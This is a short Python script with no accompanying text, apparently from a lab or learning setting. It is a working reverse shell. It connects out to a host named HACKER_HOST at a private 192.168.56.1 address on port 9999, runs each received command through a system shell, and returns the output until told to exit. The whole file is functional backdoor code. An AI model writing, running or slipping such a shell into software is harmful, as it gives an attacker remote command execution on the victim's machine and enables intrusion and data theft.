import socket
import subprocess

HACKER_HOST = '192.168.56.1'
HACKER_PORT = 9999

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((HACKER_HOST, HACKER_PORT))

try:
    while True:
        command = client_socket.recv(1024).decode()
        
        if command == 'exit': break
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.stdout: client_socket.send(output.stdout.encode())
        if output.stderr: client_socket.send(output.stderr.encode())
        
    
except Exception as e:
    print(f"Error: {e}")
finally:
    print("Closing the connection...")
    client_socket.close()